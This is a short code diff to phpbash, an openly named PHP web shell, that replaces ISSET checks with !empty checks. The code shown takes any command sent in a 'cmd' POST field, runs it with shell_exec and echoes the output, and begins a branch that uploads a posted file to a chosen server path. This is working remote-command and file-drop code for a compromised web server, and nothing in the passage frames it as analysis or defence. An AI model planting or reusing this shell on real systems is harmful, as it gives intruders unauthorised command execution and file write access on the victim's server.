@@ -1,12 +1,12 @@
 <?php
 /* phpbash by Alexander Reid (Arrexel) */
-if (ISSET($_POST['cmd'])) {
+if (!empty($_POST['cmd'])) {
     $output = preg_split('/[\n]/', shell_exec($_POST['cmd']." 2>&1"));
     foreach ($output as $line) {
         echo htmlentities($line, ENT_QUOTES | ENT_HTML5, 'UTF-8')."<br>";
     }
     die(); 
-} else if (ISSET($_FILES['file']['tmp_name']) && ISSET($_POST['path'])) {
+} else if (!empty($_FILES['file']['tmp_name']) && !empty($_POST['path'])) {
     $filename = $_FILES["file"]["name"];
     $path = $_POST['path'];
     if ($path != "/") {
